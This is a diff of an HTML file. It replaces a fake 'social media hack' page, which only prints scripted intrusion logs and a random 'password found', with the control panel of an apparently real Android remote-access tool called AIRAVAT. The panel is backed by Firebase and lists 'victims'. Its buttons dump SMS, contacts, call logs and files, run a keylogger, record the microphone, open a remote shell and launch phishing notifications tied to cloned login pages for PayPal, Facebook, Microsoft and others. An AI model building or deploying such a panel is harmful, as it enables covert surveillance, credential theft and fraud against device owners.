@@ -1,369 +1,1139 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>ALL SOCIAL MEDIA Hack</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <style>
-    body {
-      margin: 0;
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-    }
+<title>AIRAVAT</title>
+<meta charset="UTF-8" />
+<link rel="icon" href="./img/logo.png"  >
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="./firebase-app.js"></script>
+<script src="./firebase-auth.js"></script>
+<script src="./jquery.js"></script>
+<script src="./firebase-database.js"></script>
+<script type="text/javascript">
+//EDIT UNDER THIS ONLY
 
-    /* Header */
-    #headerBar {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 10px;
-      background: #111;
-      border-bottom: 1px solid #0f0;
-    }
+const firebaseConfig = {
+  apiKey: "AIzaSyD38iub-v2BWz3XPOJWboNvQXueVHFMRZs",
+  authDomain: "hami-c38b2.firebaseapp.com",
+  databaseURL: "https://hami-c38b2-default-rtdb.firebaseio.com",
+  projectId: "hami-c38b2",
+  storageBucket: "hami-c38b2.firebasestorage.app",
+  messagingSenderId: "344678153733",
+  appId: "1:344678153733:web:9f92bdfda68e33a534266c",
+  measurementId: "G-NLBR5H1G9F"
+};
+ 
 
-    #headerBar img {
-      width: 25px;
-      margin-right: 10px;
-    }
+//DON'T EDIT BELOW THIS
 
-    #createdBy {
-      font-size: 16px;
-      font-weight: bold;
-      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
-      animation: glow 2s infinite alternate;
-    }
 
-    @keyframes glow {
-      from { text-shadow: 0 0 10px #00ff00; }
-      to { text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00; }
-    }
 
-    /* Input Section */
-    #inputSection {
-      text-align: center;
-      padding: 10px;
-      background: #000;
-    }
 
-    input, select {
-      padding: 10px;
-      width: 65%;
-      font-size: 14px;
-      border: 1px solid #0f0;
-      background: #111;
-      color: #0f0;
-      outline: none;
-      margin-bottom: 5px;
-    }
-
-    button {
-      padding: 10px 20px;
-      font-size: 14px;
-      margin-left: 10px;
-      background-color: #0f0;
-      color: #000;
-      border: none;
-      cursor: pointer;
-      border-radius: 4px;
-      font-weight: bold;
-      box-shadow: 0 0 10px #00ff00;
-    }
-
-    button:hover {
-      background-color: #00cc00;
-    }
-
-    /* Console */
-    #console {
-      height: calc(100vh - 150px);
-      padding: 10px;
-      overflow-y: auto;
-      font-size: 13px;
-      line-height: 1.4;
-      border-top: 1px solid #0f0;
-      background: #000;
-    }
-
-    .blink {
-      animation: blink 1s infinite;
-      font-weight: bold;
-    }
-
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0; }
-      100% { opacity: 1; }
-    }
-
-    .error {
-      color: red;
-      font-weight: bold;
-    }
-  </style>
+firebase.initializeApp(firebaseConfig);
+</script>
 </head>
+<style type="text/css">
+*{
+padding:0;
+margin:0;
+outline:0;
+font-family:Verdana,sans-serif;
+}
+@font-face {
+font-family: 'eglantine';
+font-style: normal;
+font-weight: normal;
+src: local('eglantine'), url('./asset/eglantine.woff') format('woff');
+}
+#users{
+height:100%;
+padding-bottom:15px;
+background:#000;
+width:100%;
+z-index:999999999;
+color:green;
+display:block;
+position:relative;
+}
+.usr{
+height:auto;
+width:90%;
+padding:10px;
+color:#0dd;
+border-radius:5px;
+background:#001;
+border:1px solid #0dd;
+box-shadow:0px 0px 5px  black;
+margin:auto;
+}
+.usr button{
+height:30px;
+width:150px;
+border:0;
+background:black;
+border-radius:5px;
+border:1px solid red;
+color:red;
+}
+#resp{
+padding-bottom:20px;
+width:100%;
+background:#000;
+position:absolute;
+top:0;
+color:#0dd;
+left:0;
+overflow:scroll;
+height:calc(100% - 20px);
+display:none;
+}
+#resp li{
+list-style:none;
+width:calc(100% - 50px);
+height:50px;
+padding-left:50px;
+line-height:50px;
+user-select:none;
+position:relative;
+overflow:auto;
+}
+
+.fo{
+background:url("./img/imgg1.png");
+background-size:30px 25px;
+background-repeat:no-repeat;
+background-position:10px 12px;
+}
+.fi{
+background:url("./img/imgg3.png");
+background-size:25px 30px;
+background-repeat:no-repeat;
+background-position:12px 12px;
+}
+.vi{
+background:url("./img/i4.png");
+background-size:30px 30px;
+background-repeat:no-repeat;
+background-position:10px 12px;
+}
+.im{
+background:url("./img/imgg2.png");
+background-size:30px 30px;
+background-repeat:no-repeat;
+background-position:10px 12px;
+}
+#cmdcernter {
+position:fixed;
+top:0;
+left:0;
+opacity:1;
+background:green;
+z-index:99999;
+}
+#resp  b{
+position:absolute;
+right:10px;
+top:0px;
+color:rgb(0,255,0);
+}
+#fprev {
+position:absolute;
+top:0;
+left:0;
+height:100%;
+width:100%; 
+color:green;
+display:none;
+background:#001;
+z-index:99999999;
+text-align:center;
+}
+#fprev img{
+max-height:50%;
+max-width:100%;
+}
+#fprev li{
+
+padding:10px;
+text-align:left;
+padding-left:10px;
+width:80%;
+overflow:scroll;
+color:#0dd;
+list-style:none;
+}
+#fprev li:nth-child(5){
+text-align:center;
+background:#000;
+border:1px solid red;
+border-radius:5px;
+margin:auto;
+}
+#fprev ul{
+}
+.span{
+color:white;
+position:absolute;
+top:10px;
+border-radius:50%;
+height:35px;
+width:35px;
+background:red;
+text-align:center;
+left:10px;
+font-size:35px;
+line-height:35px;
+}
+#phones{
+width:100%;
+height:100%;
+background:url("./img/imgg.jpg");
+background-repeat:no-repeat;
+background-size:cover;
+position:absolute;
+top:0;
+left:0;
+z-index:99999999;
+display:none;
+}
+#phones .icon{
+height:50px;
+width:50px;
+background:url("./img/dump_messages.png");
+background-size:50px 50px;
+background-repeat:no-repeat;
+margin:20px;
+text-align:center;
+font-size:10px;
+color:white;
+line-height:120px;
+
+}
+.dfle{
+width:100%;
+display:flex;
+justify-content:center;
+}
+.dfle div{
+border-radius:10px;
+}
+#preloaderr {
+height:100%;
+width:100%;
+position:fixed;
+top:0;
+left:0;
+z-index:9999999999999999998;
+background:rgba(0,0,0,.9);
+display:flex;
+align-items:center;
+justify-content:center;
+}
+#preloaderr .load {
+height:50px;
+width:50px;
+border:3px solid #000;
+border-top:3px solid #0dd;
+border-radius:50%;
+position:relative;
+animation:ani 1s infinite;
+}
+@keyframes ani{
+0%{
+transform:rotate(0deg);
+}
+100%{
+transform:rotate(360deg);
+}
+}
+#loadtxt {
+color:#0f0;
+position:absolute;
+margin-top:80px;
+}
+#maindiv{
+position:fixed;
+left:0;
+top:50px;
+height:calc(100% - 50px);
+width:100%;
+z-index:99;
+background:#000;
+overflow:auto;
+}
+#tophead{
+height:50px;
+width:100%;
+position:fixed;
+top:0;
+left:0;
+background: #000;
+background: linear-gradient(
+180deg ,
+rgba(0,0,0, 0),
+rgba(0,0,0, .9)
+),url(img/bg.png);
+background-size:cover;
+color:#fff;
+text-align:center;
+}
+#tophead .h4{
+background: linear-gradient(
+90deg,
+rgba(255, 0, 0, 1) 0%,
+rgba(255, 154, 0, 1) 10%,
+rgba(208, 222, 33, 1) 20%,
+rgba(79, 220, 74, 1) 30%,
+rgba(63, 218, 216, 1) 40%,
+rgba(47, 201, 226, 1) 50%,
+rgba(28, 127, 238, 1) 60%,
+rgba(95, 21, 242, 1) 70%,
+rgba(186, 12, 248, 1) 80%,
+rgba(251, 7, 217, 1) 90%,
+rgba(255, 0, 0, 1) 100%
+);
+letter-spacing:10px;
+font-size:20px;
+color:transparent;
+position:relative;
+width:100%;
+height:100%;
+animation:anioo 2s linear infinite;
+-webkit-background-clip:text;
+font-family:'eglantine';
+}
+@keyframes anioo{
+0%{
+background-position:0 0;
+}
+
+100%{
+background-position:700px 0;
+}
+}
+#barss{
+color:white;
+position:absolute;
+top:0px;
+right:5px;
+font-size:40px;
+}
+.h4:before{
+content:'AIRAVAT';
+letter-spacing:8px;
+font-size:30px;
+color:transparent;
+background: linear-gradient(
+90deg,
+rgba(255, 0, 0, 1) 0%,
+rgba(255, 154, 0, 1) 10%,
+rgba(208, 222, 33, 1) 20%,
+rgba(79, 220, 74, 1) 30%,
+rgba(63, 218, 216, 1) 40%,
+rgba(47, 201, 226, 1) 50%,
+rgba(28, 127, 238, 1) 60%,
+rgba(95, 21, 242, 1) 70%,
+rgba(186, 12, 248, 1) 80%,
+rgba(251, 7, 217, 1) 90%,
+rgba(255, 0, 0, 1) 100%
+);
+animation:anioo2 2s linear infinite;
+-webkit-background-clip:text;
+position:absolute;
+margin:auto;
+z-index:-1;
+top:0;
+left:0;
+width:100%;
+text-align:center;
+height:100%;
+}
+@keyframes anioo2{
+0%{
+filter:blur(30px);
+background-position:0 0;
+}
+50%{
+filter:blur(1px);
+
+}
+100%{
+filter:blur(30px);
+background-position:700px 0;
+}
+}
+#navbar{
+height:100%;
+width:70%;
+background:rgba(0,0,0,.9);
+position:fixed;
+top:0;
+left:0;
+display:none;
+transition:.5s;
+padding-top:0;
+z-index:9999999999999999999999999;
+}
+#navbar li{
+list-style:none;
+width:calc(100% - 20px);
+height:60px;
+text-align:justify;
+line-height:60px;
+color:#0dd;
+padding-left:20px;
+font-weight:bolder;
+transition:.5s;
+}
+#navbar li:hover{
+width:calc(100% - 30px);
+padding-left:30px;
+background:#001;
+}
+#backkk{
+position:absolute;
+top:20px;
+display:none;
+left:15px;
+transform:scale(2);
+}
+.loginn img{
+width:80px;
+height:80px;
+border-radius:50%;
+}
+#logindiv{
+font-family: 'Comfortaa', cursive;
+height:100%;
+width:100%;
+background: rgb(2,0,36);
+background: linear-gradient(NaNdeg, rgba(2,0,36,1) 0%, rgba(16,16,146,1) 35%, rgba(0,212,255,1) 100%);
+position: fixed;
+top:0;
+//display:none;
+left:0;
+z-index:99999;
+justify-content:middle;
+align-content:center;
+margin:auto;
+}
+.loginn {
+background:rgba(0,0,0,.1);
+height:auto;
+color:#FFC72C;
+width:90%;
+position:relative;
+top:20px;
+padding:15px;
+text-align:center;
+margin:auto;
+border-radius:5px;
+box-shadow:0px 0px 15px white;
+}
+.loginn input{
+margin:5px;
+font-size:20px;
+border:0;
+width:80%;
+color:white;
+background:transparent;
+border-bottom:3px solid #FFC72C;
+}
+#lg{
+height:50px;
+width:150px;
+background: transparent;
+border:1px solid red;
+border-radius:5px;
+font-size:20px;
+color: #FFC72C;
+margin-top:10px;
+}
+input::placeholder{
+color:white;
+}
+.hqh{
+background: transparent;
+font-size:15px;
+color:#0dd;
+border:0;
+}
+#disclaim{
+height:100%;
+width:100%;
+background:#fff;
+text-align:center;
+position:fixed;
+top:0;
+display:none;
+left:0;
+z-index:999999999999999999999;
+}
+#disclaim img{
+height:30%;
+width:30%;
+}
+.tos{
+height:200px;
+width:80%;
+overflow:auto;
+background:#eee;
+padding:10px;
+border-radius:5px;
+margin:auto;
+text-align:left;
+}
+.dis{
+height:40px;
+width:150px;
+color:white;
+border-radius:5px;
+border:0;
+background:green;
+}
+.diso{
+background:red;
+}
+</style>
 <body>
-  <!-- Header -->
-  <div id="headerBar">
-    <img id="platformLogo" src="https://cdn-icons-png.flaticon.com/512/106/106853.png" alt="logo">
-    <div id="createdBy">All SOCIAL MEDIA HACK PANEL BY HACKER ARMY</div>
-  </div>
-  
-  <!-- Input -->
-  <div id="inputSection">
-    <select id="platform" onchange="changeLogo()">
-      <option value="whatsapp">WhatsApp</option>
-      <option value="facebook">Facebook</option>
-      <option value="instagram">Instagram</option>
-      <option value="tiktok">TikTok</option>
-      <option value="gmail">Gmail</option>
-      <option value="snapchat">Snapchat</option>
-      <option value="telegram">Telegram</option>
-      <option value="youtube">YouTube</option>
-      <option value="twitter">Twitter/X</option>
-    </select><br>
-    <input type="text" id="targetInput" placeholder="Enter Target ID / Number / Username">
-    <button onclick="startHack()">Start Attack</button>
-  </div>
 
-  <!-- Console -->
-  <div id="console"></div>
 
-  <script>
-    const consoleBox = document.getElementById("console");
-    const platformLogo = document.getElementById("platformLogo");
+<style type="text/css">
+.dgh{
+position:absolute;
+top:30px;
+font-size:15px;
+width:100%;
+text-align:center;
+}
+</style>
+<div id="tophead" >
+<h4 class="h4" >AIRAVAT</h4>
+<div class="dgh" >&copy; Prateek Chaubey</div>
+<div id="backkk" onclick="backk(this)">
+<svg fill="#fff"  xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
+<path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+</svg>
+</div>
+</div>
 
-    // Social media logos
-    const logos = {
-      whatsapp: "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg",
-      facebook: "https://cdn-icons-png.flaticon.com/512/733/733547.png",
-      instagram: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png",
-      tiktok: "https://cdn-icons-png.flaticon.com/512/3046/3046121.png",
-      gmail: "https://cdn-icons-png.flaticon.com/512/281/281769.png",
-      snapchat: "https://cdn-icons-png.flaticon.com/512/2111/2111700.png",
-      telegram: "https://cdn-icons-png.flaticon.com/512/2111/2111646.png",
-      youtube: "https://cdn-icons-png.flaticon.com/512/1384/1384060.png",
-      twitter: "https://cdn-icons-png.flaticon.com/512/733/733579.png"
-    };
 
-    function changeLogo() {
-      const platform = document.getElementById("platform").value;
-      platformLogo.src = logos[platform];
-    }
+<div id="maindiv" >
+<div id="preloaderr" >
+<div  class="load" >
+</div>
+<div id="loadtxt" >Processing</div>
+</div>
+<div id="users" >
+<br>
+<center>Getting List Of Victims ....</center>
+</div>
+<div id="phones" >
+<br>
 
-    function randomCode() {
-      return Math.floor(100000 + Math.random() * 900000);
-    }
+<div class="dfle"  style="" >
+<div class="icon" onclick="dumpsms()">Dump SMS</div>
+<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >CallLogs</div>
+<div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
+<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >AppsList</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >SysInfo</div>
+<div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
+<div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >PlayMusic</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >SendSMS</div>
+<div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
 
-    function addLog(text, blink=false, error=false) {
-      const line = document.createElement("div");
-      line.textContent = text;
-      if (blink) line.classList.add("blink");
-      if (error) line.classList.add("error");
-      consoleBox.appendChild(line);
-      consoleBox.scrollTop = consoleBox.scrollHeight;
-    }
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
+<div class="icon" onclick="changewallpaper()" style="background:url('./img/img1.png');background-size:50px 50px;background-repeat:no-repeat;transform:scale(1.25);">Wallpaper</div>
+<div class="icon" onclick="notificationlog()" style="background:url('./img/img2.png');background-size:50px 50px;background-repeat:no-repeat;">Notifications</div>
+<div class="icon" onclick="showphish()" style="background:url('./img/phish.png');background-size:50px 50px;background-repeat:no-repeat;">PhishData</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
+<div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
+<div class="icon" onclick="showclip()" style="background:url('./img/clip.png');background-size:50px 50px;background-repeat:no-repeat;">ClipBoard</div>
+<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/img4.png');background-size:50px 50px;background-repeat:no-repeat;">Torch</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div>
+</div>
+</div>
 
-    function startHack() {
-      const target = document.getElementById("targetInput").value.trim();
-      const platform = document.getElementById("platform").value;
-      consoleBox.innerHTML = "";
-      if (!target) {
-        alert("Please enter target details.");
-        return;
-      }
 
-      addLog("Launching " + platform.toUpperCase() + " hack on target: " + target);
+<div id="cmdcernter" style="display:none;" >
+<input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i"   ><br>
+<input type="text" id="cmd"  placeholder="cmd type"  ><br>
+<input type="text" id="cmdvar"  placeholder="cmm"  ><br>
+<input type="text" id="cmdvarm"  placeholder="cmd var optional"  ><br>
 
-      setTimeout(() => {
-        runLogs(platform, target);
-      }, 1500);
-    }
+<button onclick="cmd()" >Send</button><br>
+</div>
 
-    function runLogs(platform, target) {
-      let logs = [];
 
-      switch(platform) {
-        case "whatsapp":
-          logs = [
-            "Connecting to WhatsApp server...",
-            "Checking number registration...",
-            "Bypassing end-to-end encryption...",
-            "Extracting chat history...",
-            "Dumping contact list...",
-            "Intercepting live chat packets...",
-            "Decrypting message database...",
-            "Scanning backups...",
-            "Recovering deleted messages...",
-            "Fetching WhatsApp groups...",
-            "Extracting media files...",
-            "Reading keychain...",
-            "Running brute-force attack...",
-            "Preparing final injection..."
-          ];
-          break;
+<div id="resp" onclick="opfol(event)"   >
+</div>
 
-        case "facebook":
-          logs = [
-            "Connecting to Facebook datacenter...",
-            "Fetching user profile: " + target,
-            "Bypassing 2FA authentication...",
-            "Extracting Messenger conversations...",
-            "Dumping private albums...",
-            "Cloning access tokens...",
-            "Accessing pages and groups...",
-            "Fetching ad payment data...",
-            "Injecting graph API exploit...",
-            "Extracting location check-ins...",
-            "Scanning friend list...",
-            "Retrieving hidden posts...",
-            "Downloading archived stories..."
-          ];
-          break;
 
-        case "instagram":
-          logs = [
-            "Connecting to Instagram API...",
-            "Scanning user: " + target,
-            "Bypassing login security...",
-            "Fetching hidden photos...",
-            "Extracting private stories...",
-            "Downloading DM conversations...",
-            "Decrypting archived chats...",
-            "Cloning IG session token...",
-            "Fetching saved reels & posts...",
-            "Dumping follower database...",
-            "Extracting login history..."
-          ];
-          break;
+<div id="fprev"  >
+<h4>Preview </h4><br>
+<img id="imv"  src="img3.png" >
+<iframe id="imv2"  src="img3.png" style="height:40%;width:100%;" ></iframe>
+<br>
+<hr>
+<ul id="fprevdes" >
+<li>Name :
+<li>Size: 100 MB
+<li>Creation: 11 Aug 2055
+<li>Path: /sdcard/</li>
+<li><a download=""  id="btdwn" target="_blank"  href="hh">Download File</a><br>
+</ul>
+<style type="text/css">
+#btdwn{
+font-weight:bolder;
+color:green;
+text-decoration:none;
+}
+#fprev iframe{
+border:0;
+}
+#viewers {
+position:absolute;
+top:0;
+left:0;
+display:none;
+height:100%;
+width:100%;
+z-index:99;
+background:black;
+}
+#viewers iframe{
+height:100%;
+width:100%;
+position:absolute;
+top:0;
+left:0;
+border:0;
+}
+.down{
+height:50px;
+width:50px;
+position:fixed;
+bottom:50px;
+right:30px;
+border-radius:50%;
+background:green;
+text-align:center;
+line-height:60px;
+color:white;
+}
+.btn{
+height:40px;
+width:150px;
+border:0;
+border-radius:5px;
+border:1px solid red;
+background:black;
+color:white;
+} 
 
-        case "tiktok":
-          logs = [
-            "Connecting to TikTok main server...",
-            "Analyzing username: " + target,
-            "Bypassing captcha firewall...",
-            "Extracting draft videos...",
-            "Decrypting private messages...",
-            "Fetching monetization details...",
-            "Cloning session ID...",
-            "Dumping followers and likes...",
-            "Extracting app usage history...",
-            "Fetching device fingerprints..."
-          ];
-          break;
+#notikey {
+position:absolute;
+top:0;
+left:0;
+display:none;
+height:100%;
+width:100%;
+overflow:auto;
+z-index:999;
+background:#111;
+}
+.keylogg {
+background:rgba(0,0,0,1);
+width:calc(95% - 20px);
+height:auto;
+margin:auto;
+padding:10px;
+color:#0dd;
+padding-bottom:10px;
+margin-top:8px;
+border-radius:10px;
+overflow:auto;
+}
+.keylogg  b{
+color:red;
+}
+.keylogg img{
+max-height:50px;
+max-width:50px;
+position:absolute;
+left:20px;
+}
+.keylogg p{
+color:#fff;
+}
+.keylogg span{
+float:right;
+margin-right:10px;
+}
+#shellcmd{
+height:100%;
+width:100%;
+position:absolute;
+top:0;
+left:0;
+overflow:hidden;
+z-index:99;
+display:none;
+background:#000;
+}
+#shellcmdd{
+height:30px;
+width:98%;
+background:#001;
+position:absolute;
+bottom:0;
+left:0;
+color:white;
+border:1px solid silver;
+}
+#shelldata{
+height:calc(100% - 50px);
+width:100%;
+position:absolute;
+top:0;
+left:0;
+overflow:scroll;
+font-family:monospace;
+color:white;
+}
+</style>
+<br>
 
-        case "gmail":
-          logs = [
-            "Connecting to Google authentication server...",
-            "Fetching Gmail account: " + target,
-            "Bypassing OAuth verification...",
-            "Extracting inbox emails...",
-            "Scanning attachments for sensitive data...",
-            "Dumping sent messages...",
-            "Fetching recovery options...",
-            "Cloning active session cookies...",
-            "Downloading archived mailbox...",
-            "Decrypting Google Drive links..."
-          ];
-          break;
+<span class="span"  onclick='this.parentElement.style.display="none";setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);'>×</span>
+</div>
 
-        case "snapchat":
-          logs = [
-            "Connecting to Snapchat servers...",
-            "Analyzing username: " + target,
-            "Bypassing snap token security...",
-            "Extracting private snaps...",
-            "Decrypting memory storage...",
-            "Recovering deleted snaps...",
-            "Fetching saved stories...",
-            "Dumping snap score history...",
-            "Extracting friends list...",
-            "Accessing chat cache..."
-          ];
-          break;
 
-        case "telegram":
-          logs = [
-            "Connecting to Telegram global server...",
-            "Fetching user ID: " + target,
-            "Bypassing MTProto encryption...",
-            "Accessing secret chats...",
-            "Extracting group messages...",
-            "Dumping sticker and media database...",
-            "Recovering deleted groups...",
-            "Scanning bot history...",
-            "Extracting pinned messages..."
-          ];
-          break;
+<div id="viewers" >
+<iframe id="vieweri"  src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>" ></iframe>
+<a href="#" id="downlo"  target="_blank" download="file.html"   ><div class="down" >				<svg  fill="white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>							</div></a>
+</div>
 
-        case "youtube":
-          logs = [
-            "Connecting to YouTube datacenter...",
-            "Fetching channel: " + target,
-            "Bypassing Google security...",
-            "Extracting private playlists...",
-            "Dumping monetization reports...",
-            "Downloading unlisted videos...",
-            "Fetching comment history...",
-            "Extracting live stream keys...",
-            "Scanning analytics dashboard..."
-          ];
-          break;
 
-        case "twitter":
-          logs = [
-            "Connecting to Twitter/X API...",
-            "Fetching handle: " + target,
-            "Bypassing email verification...",
-            "Extracting private tweets...",
-            "Dumping DM history...",
-            "Cloning API keys...",
-            "Accessing verified badge details...",
-            "Fetching hidden followers...",
-            "Scanning trends participation..."
-          ];
-          break;
-      }
+<div id="shellcmd" >
+<div id="shelldata" >AIRAVAT Shell<br><sub>(some root commands may not work properly)</sub> </div>
+<input type="text" onkeyup="shellcm(this)"  id="shellcmdd" placeholder="Enter Your Command Here_"   />
+</div>
 
-      let i = 0;
-      function showLogs() {
-        if (i < logs.length) {
-          addLog("> " + logs[i]);
-          i++;
-          setTimeout(showLogs, 1000);
-        } else {
-          finishHack(platform);
-        }
-      }
-      showLogs();
-    }
 
-    function finishHack(platform) {
-      if (platform === "whatsapp") {
-        crackPassword();
-      } else {
-        addLog("Data extraction completed successfully ✅", true);
-      }
-    }
 
-    function crackPassword() {
-      let tries = 0;
-      let fakeCodes = [];
-      for (let i = 0; i < 30; i++) {
-        fakeCodes.push(randomCode());
-      }
-      let finalPass = randomCode();
+<div id="notikey" style="display:none;" ></div>
 
-      const interval = setInterval(() => {
-        if (tries < fakeCodes.length) {
-          addLog("Trying code: " + fakeCodes[tries] + " ... Failed");
-          tries++;
-        } else {
-          addLog("Password Found: " + finalPass + " ✅", true);
-          clearInterval(interval);
-        }
-      }, 600);
-    }
-  </script>
+<div id="toastdiv" >
+<br>
+<h3>Toast</h3>
+<br>
+<textarea type="text" id="toastcmd"  placeholder="Type Your Message Here"  /></textarea>
+<br><br><button onclick="toastexc()">Execute</button>
+</div>
+
+
+<div  id="diamain" onclick="this.style.display='none';" >
+<div class="diachild" >
+<h3 style="color:#0dd" >Response</h3><br>
+<p id="diatext" id="diatext" >This is response Text bsdk </p>
+<br>
+<button>OK</button>
+</div>
+</div>
+
+
+
+<div id="pvtt" >
+<h3 style="color:red" >FUN COMMANDS</h3><br><br>
+<div id="fmc1" >
+<div id="plmc" >
+<h4>Play Music </h4><br>
+<input type="text" id="musiccmd"  placeholder="Enter Direct .mp3 link"  >
+<br><button onclick="playmus()" >Execute</button>
+<br><br><hr><br>
+</div>
+<div id="vibradev" >
+<h4>Vibrate Device </h4><br>
+<input type="text" id="vibratecmd"  placeholder="Enter No. of Seconds"  >
+<br><button onclick="vibra()">Execute</button>
+<br><br><hr><br>
+</div>
+<div id="ttsdev" >
+<h4>Text To Speech </h4><br>
+<input type="text" id="ttscmd"  placeholder="Enter Your Text Message"  >
+<br><button onclick="ttsf()">Execute</button>
+<br>
+</div>
+</div>
+<div id="fmc2" >
+<div id="tonofff" >
+<h4>Turn On/Off Torch</h4><br>
+<button onclick="tont()">Turn On</button>
+<button style="margin-left:10px;"  onclick="tofft()">Turn Off</button>
+<br><br><hr><br>
+</div>
+<div id="oppweb" >
+<h4>Open URL</h4><br>
+<input type="text" id="opwebcmd"  placeholder="Enter Your URL including http://"  >
+<br><button onclick="opwebl()">Execute</button>
+</div>
+</div>
+</div>
+
+
+
+<div id="senddm">
+<h4 style="color:#0fa">Send SMS</h4><br><br>
+TO:<input type="text" id="smsnumber"  placeholder="Enter Mobile Number"  ><br><br>
+Message:<br><br><textarea id="smscontent"  placeholder="Enter Message Content" ></textarea>
+<br><br>
+<center><button onclick="sendsms()">Send SMS</button></center>
+</div>
+
+
+
+<div id="wallpaperdiv" ><br>
+<h3 style="color:#0f9" >Select Wallpaper </h3><br><br>
+<div class="wallimg" >
+<img src="./img/wall1.png" onclick="selectimg(this,0)" id="selectedimg" >
+<img src="./img/wall2.png" onclick="selectimg(this,1)" >
+<img src="./img/wall3.png" onclick="selectimg(this,2)"  >
+</div>
+<br>
+<center><button onclick="setwalls()">Set Wallpaper</button></center>
+</div>
+
+
+<div id="micrec" >
+<br>
+<h3>Record</h3>
+<br>
+<input type="text" id="recval"  placeholder="Record For x Seconds"  />
+<br><button class="btn"  onclick="recordvoice()">Record Mic</button>
+<br>
+<hr>
+<br>
+<br><h3>Recordings</h3><br>
+<div id="showrecs" >
+</div>
+
+</div>
+
+
+
+<div id="showphishj"  >
+<br>
+<h3>Phishing Commands</h3><br><br>
+<input type="text" id="nshpih"  placeholder="Enter Notification Title"  /><br>
+<br><hr>
+<select onchange="iojh()" id="lshpih" >
+<option value='0'>dropbox3.png</option><option value='1'>facebook2.png</option><option value='2'>facebook5.png</option><option value='3'>free_fire3.png</option><option value='4'>github1.png</option><option value='5'>instagram1.png</option><option value='6'>linkedin1.png</option><option value='7'>messenger1.png</option><option value='8'>microsoft1.png</option><option value='9'>netflix1.png</option><option value='10'>paypal2.png</option><option value='11'>protonmail1.png</option><option value='12'>pubg2.png</option><option value='13'>snapchat1.png</option><option value='14'>tumblir1.png</option><option value='15'>twitter1.png</option><option value='16'>wordpress1.png</option><option value='17'>yahoo1.png</option>
+
+</select>
+<img src="./imgg/dropbox3.png" id="hion"  style="max-height:60px;max-width:60px;" >
+<br><br>
+<!--jjjwjjw-->
+<center>
+<select id="phpage" >
+<option value="dropbox.html">
+
+dropbox.html
+</option>
+<option value="facebook_desktop_homepage.html">
+
+facebook_desktop_homepage.html
+</option>
+<option value="facebook_desktop_static.html">
+
+facebook_desktop_static.html
+</option>
+<option value="facebook_mobile.html">
+
+facebook_mobile.html
+</option>
+<option value="facebook_mobile_fake_security.html">
+
+facebook_mobile_fake_security.html
+</option>
+<option value="garena_free_fire.html">
+
+garena_free_fire.html
+</option>
+<option value="github.html">
+
+github.html
+</option>
+<option value="instagram.html">
+
+instagram.html
+</option>
+<option value="linkedin.html">
+
+linkedin.html
+</option>
+<option value="messenger.html">
+
+messenger.html
+</option>
+<option value="microsoft.html">
+
+microsoft.html
+</option>
+<option value="netflix.html">
+
+netflix.html
+</option>
+<option value="paypal.html">
+
+paypal.html
+</option>
+<option value="protonmail.html">
+
+protonmail.html
+</option>
+<option value="pubg.html">
+
+pubg.html
+</option>
